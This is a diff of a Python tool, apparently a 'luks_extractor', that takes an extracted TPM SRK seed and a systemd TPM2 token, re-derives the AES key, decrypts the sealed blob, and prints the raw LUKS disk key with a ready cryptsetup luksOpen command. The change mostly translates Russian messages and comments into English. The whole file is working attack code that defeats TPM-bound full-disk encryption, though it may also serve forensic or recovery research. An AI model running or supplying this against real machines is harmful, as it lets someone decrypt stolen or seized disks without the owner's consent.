@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import struct
 import hmac
 import hashlib
@@ -14,7 +15,7 @@ TPM_ALG_KEYEDHASH = 0x0008
 
 def kdfa(hash_alg, key, label, context_u, context_v, bits):
     """
-    Реализация функции KDFa (Key Derivation Function) согласно спецификации TPM 2.0.
+    Реализация функции KDFa согласно спецификации TPM 2.0.
     Используется для генерации симметричного ключа шифрования из Seed.
     """
     if hash_alg != TPM_ALG_SHA256: 
@@ -38,12 +39,10 @@ def kdfa(hash_alg, key, label, context_u, context_v, bits):
 
 def usage():
     print("Usage: python3 luks_extractor.py <srk_seed_bin> <systemd_token.json>")
-    print("Для получения srk_seed.bin необходимо запустить srk_extractor.py")
-    print("Для получения systemd_token.json необходимо запустить sd_extractor.py")
+    print("To get srk_seed.bin you need to run srk_extractor.py")
+    print("To gen systemd_token.json you need to run sd_extractor.py")
 
 def main():
-    print("=== Systemd TPM2 LUKS Key Recovery Tool ===\n")
-
     srk_seed_file = None
     sd_b64_file = None
     if len(sys.argv) > 1:
@@ -52,26 +51,24 @@ def main():
             sd_b64_file = sys.argv[2]
         except IndexError:
             pass
-        print(f"[*] Файл SRK Seed: {srk_seed_file}")
-        if sd_b64_file:
-            print(f"[*] Файл токена systemd: {sd_b64_file}")
     else:
         if os.path.isfile("srk_seed.bin"):
             srk_seed_file = "srk_seed.bin"
-            print("[*] Принимается за SRK Seed: srk_seed.bin")
         else:
-            print("[!] Файл SRK Seed не найден.")
+            print("[!] SRK seed file wan't found.")
             usage()
             return
         
         if os.path.isfile("systemd_token.json"):
             sd_b64_file = "systemd_token.json"
-            print("[*] Принимается за токен systemd: systemd_token.json")
         else:
-            print("[!] Файл токена systemd не найден.")
+            print("[!] systemd token file wan't found.")
             usage()
             return
     
+    print(f"[*] SRK Seed file: {srk_seed_file}")
+    print(f"[*] Systemd token file: {sd_b64_file}")
+
     try:
         with open(srk_seed_file, 'rb') as file:
             srk_seed = file.read()
@@ -79,31 +76,26 @@ def main():
             token = json.load(file)
             blob = base64.b64decode(token['tpm2-blob'])
     except Exception as e:
-        print(f"Ошибка при декодировании входных данных: {e}")
+        print(f"An error occured while decoding: {e}")
         sys.exit(1)
         
-    print(f"[*] Длина SRK Seed: {len(srk_seed)} байт")
-    print(f"[*] Общая длина blob: {len(blob)} байт")
+    print(f"[*] SRK Seed length: {len(srk_seed)} bytes")
+    print(f"[*] Blob length: {len(blob)} bytes")
     
-    # --- ЭТАП 1: Разбор Blob ---
     # Systemd сохраняет данные в формате: TPM2B_PRIVATE || TPM2B_PUBLIC
-    
-    # 1. Читаем TPM2B_PRIVATE (Зашифрованная часть)
+    # Читаем TPM2B_PRIVATE (зашифрованная часть)
     # Первые 2 байта - это размер структуры
     priv_size = struct.unpack('>H', blob[0:2])[0]
     tpm2b_private = blob[0 : 2 + priv_size]
     
-    # 2. Читаем TPM2B_PUBLIC (Открытая часть)
-    # Идет сразу после PRIVATE
+    # Читаем TPM2B_PUBLIC (Открытая часть)
     tpm2b_public = blob[2 + priv_size :]
     
-    print(f"[*] Размер TPM2B_PRIVATE: {len(tpm2b_private)}")
-    print(f"[*] Размер TPM2B_PUBLIC: {len(tpm2b_public)}")
+    print(f"[*] TPM2B_PRIVATE struct size: {len(tpm2b_private)}")
+    print(f"[*] TPM2B_PUBLIC struct size: {len(tpm2b_public)}")
     
-    # --- ЭТАП 2: Вычисление Name объекта ---
-    # Name необходим для генерации ключа шифрования.
+    # Восстанавливаем name
     # Name = HashAlg || Hash(TPMT_PUBLIC)
-    
     # Пропускаем первые 2 байта размера TPM2B_PUBLIC, берем тело (TPMT_PUBLIC)
     pub_struct = tpm2b_public[2:] 
     
@@ -112,19 +104,17 @@ def main():
     pub_name_alg = struct.unpack('>H', pub_struct[2:4])[0]
     
     if pub_name_alg != TPM_ALG_SHA256:
-        raise ValueError("Неподдерживаемый алгоритм. Поддерживается только SHA256.")
+        raise ValueError("Oopsie. Unsupported algorithm. Only sha256 is supported")
 
-    # Вычисляем хеш от структуры TPMT_PUBLIC
+    # TPMT_PUBLIC hash
     name_hash = hashlib.sha256(pub_struct).digest()
-    # Формируем полное имя: [AlgID] + [Hash]
+    # [AlgID] + [Hash]
     obj_name = struct.pack('>H', pub_name_alg) + name_hash
     
     print(f"[*] Name объекта: {obj_name.hex()}")
     
-    # --- ЭТАП 3: Генерация ключа расшифровки (SymKey) ---
     # TPM использует KDFa для создания ключа AES из Seed родителя (SRK)
     # Params: Hash=SHA256, Key=SRK_Seed, Label="STORAGE", ContextU=Name, Bits=128
-    
     sym_key = kdfa(
         TPM_ALG_SHA256,
         srk_seed,
@@ -134,17 +124,17 @@ def main():
         128  # 128 бит для AES-128
     )
     
-    print(f"[*] Производный симметричный ключ: {sym_key.hex()}")
+    print(f"[*] Derived symmetric (AES) key: {sym_key.hex()}")
     
-    # --- ЭТАП 4: Извлечение зашифрованных данных (Ciphertext) и IV ---
+    # EXTRACTING CIPHERTEXT
     # Структура TPM2B_PRIVATE:
     # [Size: 2] [IntegritySize: 2] [Integrity: N] [EncryptedPart...]
     # EncryptedPart для AES-CFB родителя:
     # [IV Size: 2] [IV: 16] [Ciphertext...]
     
-    cursor = 2 # Пропускаем общий size
+    cursor = 2
     
-    # Пропускаем Integrity (HMAC)
+    # Пропускаем HMAC
     integrity_size = struct.unpack('>H', tpm2b_private[cursor:cursor+2])[0]
     cursor += 2 + integrity_size
     
@@ -162,38 +152,34 @@ def main():
     ciphertext = tpm2b_private[cursor:]
     
     print(f"[*] IV: {iv.hex()}")
-    print(f"[*] Размер шифротекста: {len(ciphertext)} байт")
+    print(f"[*] Ciphertext size: {len(ciphertext)} bytes")
     
-    # --- ЭТАП 5: Расшифровка (AES-128-CFB) ---
-    
+    # ===== DECRYPTION =====
+
     cipher = Cipher(algorithms.AES(sym_key), modes.CFB(iv), backend=default_backend())
     decryptor = cipher.decryptor()
     decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
     
-    print(f"[*] Расшифровка прошла успешно.")
+    print(f"[*] Decryption success.")
     
-    # --- ЭТАП 6: Парсинг расшифрованной структуры (TPMT_SENSITIVE) ---
+    # Парсинг расшифрованной структуры (TPMT_SENSITIVE)
     # Структура:
-    # [TotalSize: 2] (systemd specific padding/struct wrapper?)
+    # [TotalSize: 2] (padding или заголовок?)
     # [SensitiveType: 2]
     # [AuthSize: 2] [AuthData...]
     # [SeedSize: 2] [SeedData...]
     # [SensitiveDataSize: 2] [SensitiveData (KEY)...]
     
-    d_cursor = 0
-    
-    # В расшифрованном блоке первым идет размер структуры TPMT_SENSITIVE
-    # Мы его пропускаем
-    d_cursor += 2 
-    
+    d_cursor = 2
+        
     # Проверяем тип
     sens_type = struct.unpack('>H', decrypted_data[d_cursor:d_cursor+2])[0]
     d_cursor += 2
     
     if sens_type != TPM_ALG_KEYEDHASH:
-        print(f"  ВНИМАНИЕ: неизвестный тип: 0x{sens_type:04x}")
+        print(f"Warning. Unknown type: 0x{sens_type:04x}")
     
-    # Пропускаем Auth Value (обычно пустое или PIN hash)
+    # Пропускаем Auth Value (или пустое или PIN hash)
     auth_size = struct.unpack('>H', decrypted_data[d_cursor:d_cursor+2])[0]
     d_cursor += 2 + auth_size
     
@@ -207,14 +193,14 @@ def main():
     
     recovered_key = decrypted_data[d_cursor : d_cursor + data_size]
     
-    print(f"\n[УСПЕХ] ВОССТАНОВЛЕН СЫРОЙ КЛЮЧ ({len(recovered_key)} байт):")
-    print(f"HEX:    {recovered_key.hex()}")
+    print(f"\n[!!!] Raw key extracted ({len(recovered_key)} bytes):")
+    print(f"HEX: {recovered_key.hex()}")
     
     # Systemd кодирует эти случайные байты в Base64 перед записью в слот LUKS
     key_b64 = base64.b64encode(recovered_key).decode('utf-8')
     print(f"BASE64: {key_b64}")
     
-    print(f"\nКоманда для монтирования:")
+    print(f"\nUse this command to mount LUKS partition:")
     print(f"printf \"{key_b64}\" | cryptsetup luksOpen /dev/luks_drive decrypted --key-file -")
 
 if __name__ == "__main__":
